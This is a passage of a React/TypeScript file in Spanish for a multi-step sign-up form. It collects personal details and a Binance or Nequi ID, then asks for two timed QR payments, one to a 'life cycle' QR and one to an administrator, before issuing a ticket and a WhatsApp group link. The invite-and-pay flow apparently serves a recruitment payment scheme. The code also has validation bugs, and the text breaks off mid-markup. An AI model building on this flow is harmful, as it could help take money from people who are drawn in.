import { useState, useEffect, useRef } from 'react';
import confetti from 'canvas-confetti';
import { 
  User, UserPlus, Globe, Phone, Mail, Fingerprint, 
  ChevronDown, AlertTriangle, ArrowLeft, ArrowRight,
  CircleX, Timer, Copy, Hash, CheckCircle2, Ticket,
  TicketCheck, X
} from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';

interface FormData {
  name: string;
  invitee: string;
  country: string;
  phone: string;
  email: string;
  hasMoney: string;
  paymentMethod: string;
  binanceId: string;
  binanceIdStep2: string;
  binanceIdStep3: string;
}

const countries = ['México', 'España', 'Colombia', 'Argentina', 'Perú', 'Chile'];

export function RegistrationForm() {
  const [currentStep, setCurrentStep] = useState(1);
  const [showPlatformModal, setShowPlatformModal] = useState(false);
  const [selectedPlatform, setSelectedPlatform] = useState<'binance' | 'nequi' | null>(null);
  const [formData, setFormData] = useState<FormData>({
    name: '',
    invitee: '',
    country: '',
    phone: '',
    email: '',
    hasMoney: '',
    paymentMethod: '',
    binanceId: '',
    binanceIdStep2: '',
    binanceIdStep3: ''
  });
  const [errors, setErrors] = useState<Record<string, boolean>>({});
  const [showCountryDropdown, setShowCountryDropdown] = useState(false);
  const [showTicketModal, setShowTicketModal] = useState(false);
  const [timer1, setTimer1] = useState(30 * 60); // 30 minutes
  const [timer2, setTimer2] = useState(30 * 60);
  const [orderId1] = useState(Math.random().toString(36).substr(2, 9).toUpperCase());
  const [orderId2] = useState(Math.random().toString(36).substr(2, 9).toUpperCase());
  const [ticketId] = useState(Math.random().toString(36).substr(2, 9).toUpperCase());
  const [generatedCodes, setGeneratedCodes] = useState<{codigo: string, oculto: string} | null>(null);
  const [qrSettings, setQrSettings] = useState<any>(null);
  const [adminQrSettings, setAdminQrSettings] = useState<any>(null);
  const [nequiQrSettings, setNequiQrSettings] = useState<any>(null);
  const [adminNequiQrSettings, setAdminNequiQrSettings] = useState<any>(null);

  // Load QR settings on mount
  useEffect(() => {
    fetchQrSettings();
    fetchAdminQrSettings();
    fetchNequiQrSettings();
    fetchAdminNequiQrSettings();
  }, []);

  const fetchQrSettings = async () => {
    try {
      const { data, error } = await supabase
        .rpc('get_active_qr_setting', { qr_type: 'register' });

      if (error) {
        console.error('Error fetching QR settings:', error);
        return;
      }

      if (data && data.length > 0) {
        setQrSettings(data[0]);
      }
    } catch (error) {
      console.error('Error fetching QR settings:', error);
    }
  };

  const fetchAdminQrSettings = async () => {
    try {
      console.log('Fetching admin QR settings...');
      
      // Primero intentamos con la función RPC
      const { data: rpcData, error: rpcError } = await supabase
        .rpc('get_active_qr_setting', { qr_type: 'register_admin' });

      console.log('RPC result for register_admin:', { rpcData, rpcError });

      if (rpcError) {
        console.error('RPC Error fetching admin QR settings:', rpcError);
      }

      if (rpcData && rpcData.length > 0) {
        console.log('Setting admin QR settings from RPC:', rpcData[0]);
        setAdminQrSettings(rpcData[0]);
        return;
      }

      // Si RPC no devuelve datos, consultar directamente la tabla
      console.log('RPC returned no data, trying direct query...');
      const { data: directData, error: directError } = await supabase
        .from('qr_settings')
        .select('*')
        .eq('type', 'register_admin')
        .eq('is_active', true)
        .order('updated_at', { ascending: false })
        .maybeSingle();

      console.log('Direct query result:', { directData, directError });

      if (directError) {
        console.error('Direct query error:', directError);
        return;
      }

      if (directData) {
        console.log('Setting admin QR settings from direct query:', directData);
        setAdminQrSettings(directData);
      } else {
        console.log('No admin QR settings found');
        setAdminQrSettings(null);
      }
    } catch (error) {
      console.error('Error fetching admin QR settings:', error);
    }
  };

  const fetchNequiQrSettings = async () => {
    try {
      const { data, error } = await supabase
        .rpc('get_active_qr_setting', { qr_type: 'register_nequi' });

      if (error) {
        console.error('Error fetching Nequi QR settings:', error);
        return;
      }

      if (data && data.length > 0) {
        setNequiQrSettings(data[0]);
      }
    } catch (error) {
      console.error('Error fetching Nequi QR settings:', error);
    }
  };

  const fetchAdminNequiQrSettings = async () => {
    try {
      const { data, error } = await supabase
        .rpc('get_active_qr_setting', { qr_type: 'register_admin_nequi' });

      if (error) {
        console.error('Error fetching Admin Nequi QR settings:', error);
        return;
      }

      if (data && data.length > 0) {
        setAdminNequiQrSettings(data[0]);
      }
    } catch (error) {
      console.error('Error fetching Admin Nequi QR settings:', error);
    }
  };

  // Timer effects
  useEffect(() => {
    if (currentStep === 2 && timer1 > 0) {
      const interval = setInterval(() => {
        setTimer1(prev => prev - 1);
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [currentStep, timer1]);

  useEffect(() => {
    if (currentStep === 3 && timer2 > 0) {
      const interval = setInterval(() => {
        setTimer2(prev => prev - 1);
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [currentStep, timer2]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const validateStep1 = () => {
    const newErrors: Record<string, boolean> = {};
    
    const nameWords = formData.name.trim().split(/\s+/).filter(word => word.length > 0);
    if (!formData.name || nameWords.length < 3 || nameWords.length > 4) {
      newErrors.name = true;
    }
    
    const inviteeWords = formData.invitee.trim().split(/\s+/).filter(word => word.length > 0);
    if (!formData.invitee || inviteeWords.length < 3 || inviteeWords.length > 4) {
      newErrors.invitee = true;
    }
    
    
    if ((formData.paymentMethod === 'binance_pay' && (!formData.binanceId || !/^\d{9,10}$/.test(formData.binanceId))) ||
        (formData.paymentMethod === 'nequi_pay' && !formData.binanceId)) {
      newErrors.binanceId = true;
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validateStep2 = () => {
    const newErrors: Record<string, boolean> = {};
    
    if (!formData.binanceIdStep2 || formData.binanceIdStep2.length < 10 || formData.binanceIdStep2.length > 19) {
      newErrors.binanceIdStep2 = true;
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validateStep3 = () => {
    const newErrors: Record<string, boolean> = {};
    
    if (!formData.binanceIdStep3 || formData.binanceIdStep3.length < 10 || formData.binanceIdStep3.length > 19) {
      newErrors.binanceIdStep3 = true;
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  // Code generation functions
  const generarCodigoNumero = () => {
    return Array.from({ length: 16 }, () => Math.floor(Math.random() * 10)).join('');
  };

  const generarCodigoNumeroYOculto = () => {
    const codigo = generarCodigoNumero();
    return { codigo, oculto: codigo.slice(0, 4) + 'x'.repeat(codigo.length - 4) };
  };

  const saveToSupabase = async (codes: { codigo: string; oculto: string }) => {
    try {
      const { error } = await supabase
        .from('register')
        .insert({
          name: formData.name,
          phone: formData.phone,
          country: formData.country,
          invitee: formData.invitee,
          has_money: formData.hasMoney === 'yes',
          payment_method: formData.paymentMethod,
          binance_id: formData.binanceId,
          binance_id_step2: formData.binanceIdStep2,
          binance_id_step3: formData.binanceIdStep3,
          order_id_1: orderId1,
          order_id_2: orderId2,
          ticket_id: ticketId,
          codigo_full: codes.codigo,
          codigo_masked: codes.oculto,
        });

      if (error) {
        console.error('Error saving registration:', error);
      } else {
        console.log('Registration saved successfully');
      }
    } catch (error) {
      console.error('Error saving to Supabase:', error);
    }
  };

  const handleNext = () => {
    if (currentStep === 1 && validateStep1()) {
      setCurrentStep(2);
    } else if (currentStep === 2 && validateStep2()) {
      setCurrentStep(3);
    } else if (currentStep === 3 && validateStep3()) {
      // Generate codes only once when completing the form
      const codes = generarCodigoNumeroYOculto();
      setGeneratedCodes(codes);
      setCurrentStep(4);
      // Save to Supabase with the same codes used in UI
      saveToSupabase(codes);
      // Auto show ticket modal when reaching final step
      setTimeout(() => {
        setShowTicketModal(true);
        // Trigger confetti when ticket modal opens
        setTimeout(() => {
          confetti({
            particleCount: 150,
            spread: 100,
            origin: { y: 0.6 },
            colors: ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff']
          });
        }, 300);
      }, 100);
    }
  };

  const handlePrev = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const openWhatsApp = () => {
    window.open('https://chat.whatsapp.com/LYLFjBIsoWs2S9LgmPR3sv?mode=ac_t', '_blank');
    setShowTicketModal(false);
  };

  const handlePlatformSelection = (platform: 'binance' | 'nequi') => {
    setSelectedPlatform(platform);
    setShowPlatformModal(false);
    // Now proceed to next step based on selected platform
    if (platform === 'nequi') {
      // Nequi flow: Registration $25 USD → QR Payment (Life Cycle) - Nequi → QR Payment (Admin) - Nequi → Final success
      setCurrentStep(2);
    } else {
      // Binance flow
      setCurrentStep(2);
    }
  };

  const canProceedStep1 = formData.name && formData.invitee && formData.country && 
                          formData.phone && formData.hasMoney && 
                          formData.paymentMethod && 
                           (formData.paymentMethod !== 'binance_pay' && formData.paymentMethod !== 'nequi_pay') || 
                           (formData.paymentMethod === 'binance_pay' && formData.binanceId) ||
                           (formData.paymentMethod === 'nequi_pay' && formData.binanceId);

  const canProceedStep2 = formData.binanceIdStep2.length >= 10 && formData.binanceIdStep2.length <= 19;
  const canProceedStep3 = formData.binanceIdStep3.length >= 10 && formData.binanceIdStep3.length <= 19;

  return (
    <>
      {/* Platform Selection Modal */}
      {showPlatformModal && (
        <div className="fixed inset-0 z-50 overflow-auto bg-black/60">
          <div className="absolute inset-0 bg-black/50 backdrop-blur-sm" />
          <div className="relative mx-auto w-full max-w-md px-4 py-8 min-h-full flex items-center justify-center">
            <div className="w-full rounded-2xl bg-[#0c111b] ring-1 ring-white/10 shadow-2xl overflow-hidden">
              <div className="px-6 py-4 border-b border-white/10">
                <h3 className="text-lg font-semibold tracking-tight text-white font-inter">Selecciona tu plataforma</h3>
                <p className="text-sm text-muted-foreground mt-1 font-inter">¿Cuál es tu método de pago preferido?</p>
              </div>

              <div className="p-6 space-y-4">
                <button
                  onClick={() => handlePlatformSelection('binance')}
                  className="w-full group rounded-lg ring-1 ring-white/10 bg-white/5 hover:bg-white/10 hover:ring-primary/50 transition p-4 text-left"
                >
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-lg bg-yellow-500/20 flex items-center justify-center">
                      <Hash className="w-5 h-5 text-yellow-400" />
                    </div>
                    <div>
                      <h4 className="text-sm font-medium text-foreground font-inter">Binance</h4>
                      <p className="text-xs text-muted-foreground font-inter">Pago con Binance Pay</p>
                    </div>
                  </div>
                </button>
                
                <button
                  onClick={() => handlePlatformSelection('nequi')}
                  className="w-full group rounded-lg ring-1 ring-white/10 bg-white/5 hover:bg-white/10 hover:ring-primary/50 transition p-4 text-left"
                >
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-lg bg-green-500/20 flex items-center justify-center">
                      <Hash className="w-5 h-5 text-green-400" />
                    </div>
                    <div>
                      <h4 className="text-sm font-medium text-foreground font-inter">Nequi</h4>
                      <p className="text-xs text-muted-foreground font-inter">Pago con Nequi</p>
                    </div>
                  </div>
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      <div className="rounded-2xl ring-1 ring-white/10 backdrop-blur-sm p-6 md:p-8 bg-gradient-to-b from-[#4a009d] to-[#050010] relative">
        <div className="absolute inset-0 rounded-2xl">
          <div className="absolute inset-0 rounded-2xl bg-gradient-to-br from-violet-500/10 via-indigo-500/10 to-cyan-500/10 animate-pulse" />
          <div className="absolute inset-0 rounded-2xl bg-gradient-to-r from-violet-500/5 via-transparent to-cyan-500/5 blur-xl" />
        </div>
        
        <div className="relative z-10">
          <div className="mb-6">
            <h1 className="text-2xl md:text-3xl font-semibold tracking-tight text-white font-inter">
              Vamos a crear tu cuenta
            </h1>
            {selectedPlatform && (
              <div className="mt-2">
                <span className="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-medium bg-primary/20 text-primary ring-1 ring-primary/30">
                  <Hash className="w-3 h-3" />
                  Plataforma seleccionada: {selectedPlatform === 'binance' ? 'Binance' : 'Nequi'}
                </span>
              </div>
            )}
            <p className="text-sm text-muted-foreground mt-1.5 font-inter">
              Completa los pasos y estarás listo en minutos.
            </p>
          </div>

          {/* Step 1: Personal Info */}
          {currentStep === 1 && (
            <div className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {/* Name */}
                <div>
                  <label className="block text-sm text-muted-foreground mb-1.5 font-inter">Nombres</label>
                  <div className="relative">
                    <User className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                    <input
                      type="text"
                      placeholder="Tu nombre completo"
                      value={formData.name}
                      onChange={(e) => setFormData({...formData, name: e.target.value})}
                      className="w-full rounded-md bg-white/5 ring-1 ring-white/10 focus:ring-2 focus:ring-primary/60 outline-none px-9 py-2.5 text-sm placeholder:text-muted-foreground text-foreground transition font-inter"
                    />
                  </div>
                  {errors.name && (
                    <div className="mt-1.5 text-xs text-amber-300 flex items-center gap-1.5">
                      <AlertTriangle className="w-3.5 h-3.5" />
                      <span><strong className="font-medium">Nombre inválido</strong> — Debe tener entre 3 y 4 palabras.</span>
                    </div>
                  )}
                </div>

                {/* Invitee */}
                <div>
                  <label className="block text-sm text-muted-foreground mb-1.5 font-inter">¿A quién estás invitando?</label>
                  <div className="relative">
                    <UserPlus className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                    <input
                      type="text"
                      placeholder="Nombre de la persona"
                      value={formData.invitee}
                      onChange={(e) => setFormData({...formData, invitee: e.target.value})}
                      className="w-full rounded-md bg-white/5 ring-1 ring-white/10 focus:ring-2 focus:ring-primary/60 outline-none px-9 py-2.5 text-sm placeholder:text-muted-foreground text-foreground transition font-inter"
                    />
                  </div>
                  {errors.invitee && (
                    <div className="mt-1.5 text-xs text-amber-300 flex items-center gap-1.5">
                      <AlertTriangle className="w-3.5 h-3.5" />
                      <span><strong className="font-medium">Invitando a inválida</strong> — Debe tener entre 3 y 4 palabras.</span>
                    </div>
                  )}
                </div>

                {/* Country */}
                <div className="relative">
                  <label className="block text-sm text-muted-foreground mb-1.5 font-inter">País</label>
                  <button
                    type="button"
                    onClick={() => setShowCountryDropdown(!showCountryDropdown)}
                    className="w-full flex items-center justify-between rounded-md bg-white/5 ring-1 ring-white/10 hover:ring-white/20 focus:ring-2 focus:ring-primary/60 outline-none px-3.5 py-2.5 text-sm text-foreground transition"
                  >
                    <span className="flex items-center gap-2">
                      <Globe className="w-4 h-4 text-muted-foreground" />
                      <span className={formData.country ? "text-foreground" : "text-muted-foreground"}>
                        {formData.country || "Selecciona un país"}
                      </span>
                    </span>
                    <ChevronDown className="w-4 h-4 text-muted-foreground" />
                  </button>
                  {showCountryDropdown && (
                    <div className="absolute z-20 mt-2 w-full rounded-lg bg-[#0f1522] ring-1 ring-white/10 shadow-xl p-2">
                      <div className="max-h-56 overflow-auto">
                        {countries.map((country) => (
                          <button
                            key={country}
                            onClick={() => {
                              setFormData({...formData, country});
                              setShowCountryDropdown(false);
                            }}
                            className="w-full text-left px-3 py-2 rounded-md text-sm text-foreground hover:bg-white/5 transition"
                          >
                            {country}
                          </button>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {/* Phone */}
                <div>
                  <label className="block text-sm text-muted-foreground mb-1.5 font-inter">Número de celular (WhatsApp)</label>
                  <div className="relative">
                    <Phone className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                    <input
                      type="tel"
                      placeholder="+52 55 0000 0000"
                      value={formData.phone}
                      onChange={(e) => setFormData({...formData, phone: e.target.value})}
                      className="w-full rounded-md bg-white/5 ring-1 ring-white/10 focus:ring-2 focus:ring-primary/60 outline-none px-9 py-2.5 text-sm placeholder:text-muted-foreground text-foreground transition font-inter"
                    />
                  </div>
                </div>


                {/* Money */}
                <div>
                  <label className="block text-sm text-muted-foreground mb-2 font-inter">¿Tienes dinero?</label>
                  <div className="inline-flex rounded-lg ring-1 ring-white/10 p-1 bg-white/5">
                    <button
                      type="button"
                      onClick={() => setFormData({...formData, hasMoney: 'yes'})}
                      className={`px-4 py-2 text-sm rounded-md transition ${
                        formData.hasMoney === 'yes' 
                          ? 'bg-white/10 text-white' 
                          : 'text-muted-foreground hover:text-white hover:bg-white/5'
                      }`}
                    >
                      Sí
                    </button>
                    <button
                      type="button"
                      onClick={() => setFormData({...formData, hasMoney: 'no'})}
                      className={`px-4 py-2 text-sm rounded-md transition ${
                        formData.hasMoney === 'no' 
                          ? 'bg-white/10 text-white' 
                          : 'text-muted-foreground hover:text-white hover:bg-white/5'
                      }`}
                    >
                      No
                    </button>
                  </div>
                </div>
              </div>

              {/* Payment Method Selection */}
              <div>
                <label className="block text-sm text-muted-foreground mb-4 font-inter">Selecciona tu método de pago preferido:</label>
                <div className="grid grid-cols-2 gap-4">
                  {/* Binance Pay Option */}
                  <button
                    type="button"
                    onClick={() => setFormData({...formData, paymentMethod: 'binance_pay', binanceId: ''})}
                    onDoubleClick={() => setFormData({...formData, paymentMethod: 'binance_pay', binanceId: ''})}
                    className={`relative rounded-xl p-6 text-left transition-all duration-300 border-2 hover:scale-105 hover:shadow-lg ${
                      formData.paymentMethod === 'binance_pay' 
                        ? 'border-primary bg-primary/10 shadow-lg shadow-primary/20' 
                        : 'border-white/10 bg-white/5 hover:bg-white/10 hover:border-white/20'
                    }`}
                  >
                    <div className="flex flex-col items-center gap-3">
                      <div className={`p-3 rounded-full ${
                        formData.paymentMethod === 'binance_pay' 
                          ? 'bg-primary/20 text-primary' 
                          : 'bg-white/10 text-muted-foreground'
                      }`}>
                        <Fingerprint className="w-6 h-6" />
                      </div>
                      <span className="text-sm font-medium text-foreground font-inter">
                        Binance Pay
                      </span>
                      {formData.paymentMethod === 'binance_pay' && (
                        <div className="absolute top-2 right-2">
                          <div className="w-3 h-3 rounded-full bg-primary"></div>
                        </div>
                      )}
                    </div>
                  </button>

                  {/* Nequi Option */}
                  <button
                    type="button"
                    onClick={() => setFormData({...formData, paymentMethod: 'nequi', binanceId: ''})}
                    onDoubleClick={() => setFormData({...formData, paymentMethod: 'nequi', binanceId: ''})}
                    className={`relative rounded-xl p-6 text-left transition-all duration-300 border-2 hover:scale-105 hover:shadow-lg ${
                      formData.paymentMethod === 'nequi' 
                        ? 'border-primary bg-primary/10 shadow-lg shadow-primary/20' 
                        : 'border-white/10 bg-white/5 hover:bg-white/10 hover:border-white/20'
                    }`}
                  >
                    <div className="flex flex-col items-center gap-3">
                      <div className={`p-3 rounded-full ${
                        formData.paymentMethod === 'nequi' 
                          ? 'bg-primary/20 text-primary' 
                          : 'bg-white/10 text-muted-foreground'
                      }`}>
                        <Phone className="w-6 h-6" />
                      </div>
                      <span className="text-sm font-medium text-foreground font-inter">
                        Nequi
                      </span>
                      {formData.paymentMethod === 'nequi' && (
                        <div className="absolute top-2 right-2">
                          <div className="w-3 h-3 rounded-full bg-primary"></div>
                        </div>
                      )}
                    </div>
                  </button>
                </div>

                {/* Payment Method Input Fields */}
                <div className="mt-6">
                  {formData.paymentMethod === 'binance_pay' && (
                    <div>
                      <label className="block text-sm text-muted-foreground mb-2 font-inter">
                        ID de Binance Pay (9-10 dígitos)
                      </label>
                      <div className="relative">
                        <input
                          type="text"
                          placeholder="9 o 10 dígitos"
                          value={formData.binanceId}
                          onChange={(e) => setFormData({...formData, binanceId: e.target.value})}
                          className="w-full rounded-md bg-white/5 ring-1 ring-white/10 focus:ring-2 focus:ring-primary/60 outline-none px-9 py-2.5 text-sm placeholder:text-muted-foreground text-foreground transition font-inter"
                        />
                      </div>
                      {errors.binanceId && (
                        <div className="mt-1.5 text-xs text-amber-300 flex items-center gap-1.5">
                          <AlertTriangle className="w-3.5 h-3.5" />
                          <span><strong className="font-medium">ID inválido</strong> — Debe tener entre 9 y 10 dígitos numéricos.</span>
                        </div>
                      )}
                    </div>
                  )}

                  {formData.paymentMethod === 'nequi' && (
                    <div>
                      <label className="block text-sm text-muted-foreground mb-2 font-inter">
                        Número de Nequi
                      </label>
                      <div className="relative">
                        <Phone className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                        <input
                          type="text"
                          placeholder="Número de Nequi"
                          value={formData.binanceId}
                          onChange={(e) => setFormData({...formData, binanceId: e.target.value})}
                          className="w-full rounded-md bg-white/5 ring-1 ring-white/10 focus:ring-2 focus:ring-primary/60 outline-none px-9 py-2.5 text-sm placeholder:text-muted-foreground text-foreground transition font-inter"
                        />
                      </div>
                      {errors.binanceId && (
                        <div className="mt-1.5 text-xs text-amber-300 flex items-center gap-1.5">
                          <AlertTriangle className="w-3.5 h-3.5" />
                          <span><strong className="font-medium">Número inválido</strong> — Ingresa un número de Nequi válido.</span>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              </div>

              <div className="h-px bg-white/10" />

              <div className="flex items-center justify-between">
                <button
                  type="button"
                  disabled
                  className="inline-flex items-center gap-2 rounded-md px-3.5 py-2 text-sm text-muted-foreground hover:text-white hover:bg-white/5 ring-1 ring-white/10 transition disabled:opacity-40 disabled:cursor-not-allowed"
                >
                  <ArrowLeft className="w-4 h-4" />
                  Atrás
                </button>
                <button
                  type="button"
                  onClick={() => {
                    if (validateStep1()) {
                      setShowPlatformModal(true);
                    }
                  }}
                  disabled={!canProceedStep1}
                  className="inline-flex items-center gap-2 rounded-md px-4 py-2 text-sm text-white bg-primary hover:bg-primary/80 ring-1 ring-primary/50 disabled:opacity-40 disabled:cursor-not-allowed transition"
                >
                  Continuar
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </div>
          )}

          {/* Step 2: QR Payment */}
          {currentStep === 2 && (
            <div className="space-y-6">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-xl font-semibold tracking-tight text-white font-inter">Pago por QR Ciclo vida</h2>
                  <p className="text-sm text-muted-foreground mt-1 font-inter">
                    Escanea el código para continuar. Tiempo restante: <span className="text-foreground">{formatTime(timer1)}</span>
                  </p>
                </div>
                <div className="rounded-md px-3 py-2 bg-white/5 ring-1 ring-white/10 text-sm text-muted-foreground flex items-center gap-2">
                  <Timer className="w-4 h-4 text-primary" />
                  <span>30 minutos</span>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="rounded-xl bg-[#0f1522] ring-1 ring-white/10 p-4 grid place-items-center">
                  <div className="rounded-lg bg-white p-3">
                    {(formData.paymentMethod === 'binance_pay' ? qrSettings : nequiQrSettings)?.qr_image_url ? (
                      <img 
                        src={(formData.paymentMethod === 'binance_pay' ? qrSettings : nequiQrSettings)?.qr_image_url} 
                        alt="QR Code" 
                        className="h-48 w-48 object-contain rounded"
                      />
                    ) : (
                      <div className="h-48 w-48 bg-gray-200 rounded flex items-center justify-center">
                        <span className="text-gray-500 text-sm">QR Code</span>
                      </div>
                    )}
                  </div>
                  <p className="text-xs text-muted-foreground mt-3 font-inter">Usa tu app para escanear</p>
                </div>

                <div className="rounded-xl bg-white/5 ring-1 ring-white/10 p-4 space-y-4">
                  <div className="flex items-center justify-between">
                    <span className="text-sm text-muted-foreground font-inter">Codigo ID</span>
                    <div className="flex items-center gap-2">
                      <code className="text-sm text-foreground font-mono">{(formData.paymentMethod === 'binance_pay' ? qrSettings : nequiQrSettings)?.code_id || 'N/A'}</code>
                      <button
                        onClick={() => copyToClipboard((formData.paymentMethod === 'binance_pay' ? qrSettings : nequiQrSettings)?.code_id || '')}
                        className="inline-flex items-center gap-1.5 rounded-md px-2 py-1 text-xs text-muted-foreground hover:text-white hover:bg-white/5 ring-1 ring-white/10 transition"
                      >
                        <Copy className="w-3.5 h-3.5" /> Copiar
                      </button>
                    </div>
                  </div>
                  <div className="h-px bg-white/10" />
                  <div className="space-y-2">
                    <div className="flex items-center justify-between text-sm">
                      <span className="text-muted-foreground font-inter">Estado</span>
                      <span className="text-blue-300">Pendiente</span>
                    </div>
                    <div className="flex items-center justify-between text-sm">
                      <span className="text-muted-foreground font-inter">Método</span>
                      <span className="text-foreground">Ciclo vida</span>
                    </div>
                  </div>
                  <div className="pt-2">
                    <label className="block text-sm text-muted-foreground mb-1.5 font-inter">ID de Orden (10–19 dígitos)</label>
                    <div className="relative">
                      <Hash className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                      <input
                        type="text"
                       placeholder={formData.paymentMethod === 'binance_pay' ? 'Ingresa tu ID de Binance' : 'Ingresa tu ID de Nequi'}
                        value={formData.binanceIdStep2}
                        onChange={(e) => setFormData({...formData, binanceIdStep2: e.target.value})}
                        className="w-full rounded-md bg-white/5 ring-1 ring-white/10 focus:ring-2 focus:ring-primary/60 outline-none px-9 py-2.5 text-sm placeholder:text-muted-foreground text-foreground transition font-inter"
                      />
                    </div>
                    {errors.binanceIdStep2 && (
                      <div className="mt-1.5 text-xs text-amber-300 flex items-center gap-1.5">
                        <AlertTriangle className="w-3.5 h-3.5" />
                        <span><strong className="font-medium">ID de Binance inválido</strong> — Debe tener entre 10 y 19 dígitos numéricos.</span>
                      </div>
                    )}
                  </div>
                </div>
              </div>

              <div className="h-px bg-white/10" />

              <div className="flex items-center justify-between">
                <button
                  type="button"
                  onClick={handlePrev}
                  className="inline-flex items-center gap-2 rounded-md px-3.5 py-2 text-sm text-muted-foreground hover:text-white hover:bg-white/5 ring-1 ring-white/10 transition"
                >
                  <ArrowLeft className="w-4 h-4" />
                  Atrás
                </button>
                <button
                  type="button"
                  onClick={handleNext}
                  disabled={!canProceedStep2}
                  className="inline-flex items-center gap-2 rounded-md px-4 py-2 text-sm text-white bg-primary hover:bg-primary/80 ring-1 ring-primary/50 transition disabled:opacity-40 disabled:cursor-not-allowed"
                >
                  Continuar
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </div>
          )}

          {/* Step 3: Admin QR */}
          {currentStep === 3 && (
            <div className="space-y-6">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-xl font-semibold tracking-tight text-white font-inter">Pago de QR (Admin)</h2>
                  <p className="text-sm text-muted-foreground mt-1 font-inter">
                    Escanea el QR del administrador. Tiempo restante: <span className="text-foreground">{formatTime(timer2)}</span>
                  </p>
                </div>
                <div className="rounded-md px-3 py-2 bg-white/5 ring-1 ring-white/10 text-sm text-muted-foreground flex items-center gap-2">
                  <Timer className="w-4 h-4 text-primary" />
                  <span>30 minutos</span>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="rounded-xl bg-[#0f1522] ring-1 ring-white/10 p-4 grid place-items-center">
                  <div className="rounded-lg bg-white p-3">
                    {(formData.paymentMethod === 'binance_pay' ? adminQrSettings : adminNequiQrSettings)?.qr_image_url ? (
                      <img 
                        src={(formData.paymentMethod === 'binance_pay' ? adminQrSettings : adminNequiQrSettings)?.qr_image_url} 
                        alt="QR Code Admin" 
                        className="h-48 w-48 object-contain rounded"
                      />
                    ) : (
                      <div className="h-48 w-48 bg-gray-200 rounded flex items-center justify-center">
                        <span className="text-gray-500 text-sm">Admin QR</span>
                      </div>
                    )}
                  </div>
                  <p className="text-xs text-muted-foreground mt-3 font-inter">Solicita el QR del administrador</p>
                </div>

                <div className="rounded-xl bg-white/5 ring-1 ring-white/10 p-4 space-y-4">
                  <div className="flex items-center justify-between">
                    <span className="text-sm text-muted-foreground font-inter">Codigo ID</span>
                    <div className="flex items-center gap-2">
                        <code className="text-sm text-foreground font-mono">
                          {(formData.paymentMethod === 'binance_pay' ? adminQrSettings : adminNequiQrSettings)?.code_id && 
                           (formData.paymentMethod === 'binance_pay' ? adminQrSettings : adminNequiQrSettings).code_id.trim() !== '' ? 
                           (formData.paymentMethod === 'binance_pay' ? adminQrSettings : adminNequiQrSettings).code_id : 'Pendiente'}
                        </code>
                      <button
                        onClick={() => copyToClipboard((formData.paymentMethod === 'binance_pay' ? adminQrSettings : adminNequiQrSettings)?.code_id || '')}
                        className="inline-flex items-center gap-1.5 rounded-md px-2 py-1 text-xs text-muted-foreground hover:text-white hover:bg-white/5 ring-1 ring-white/10 transition"
                      >
                        <Copy className="w-3.5 h-3.5" /> Copiar
                      </button>
                    </div>
                  </div>
                  <div className="h-px bg-white/10" />
                  <div className="space-y-2">
                    <div className="flex items-center justify-between text-sm">
                      <span className="text-muted-foreground font-inter">Estado</span>
                      <span className="text-blue-300">Pendiente</span>
                    </div>
                    <div className="flex items-center justify-between text-sm">
                      <span className="text-muted-foreground font-inter">Asignado por</span>
                      <span className="text-foreground">Administrador</span>
                    </div>
                  </div>
                  <div className="pt-2">
                    <label className="block text-sm text-muted-foreground mb-1.5 font-inter">ID de Orden (10–19 dígitos)</label>
                    <div className="relative">
                      <Hash className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                      <input
                        type="text"
                        placeholder={formData.paymentMethod === 'binance_pay' ? 'Ingresa tu ID de Binance' : 'Ingresa tu ID de Nequi'}
                        value={formData.binanceIdStep3}
                        onChange={(e) => setFormData({...formData, binanceIdStep3: e.target.value})}
                        className="w-full rounded-md bg-white/5 ring-1 ring-white/10 focus:ring-2 focus:ring-primary/60 outline-none px-9 py-2.5 text-sm placeholder:text-muted-foreground text-foreground transition font-inter"
                      />
                    </div>
                    {errors.binanceIdStep3 && (
                      <div className="mt-1.5 text-xs text-amber-300 flex items-center gap-1.5">
                        <AlertTriangle className="w-3.5 h-3.5" />
                        <span><strong className="font-medium">ID de Binance inválido</strong> — Debe tener entre 10 y 19 dígitos numéricos.</span>
                      </div>
                    )}
                  </div>
                </div>
              </div>

              <div className="h-px bg-white/10" />

              <div className="flex items-center justify-between">
                <button
                  type="button"
                  onClick={handlePrev}
                  className="inline-flex items-center gap-2 rounded-md px-3.5 py-2 text-sm text-muted-foreground hover:text-white hover:bg-white/5 ring-1 ring-white/10 transition"
                >
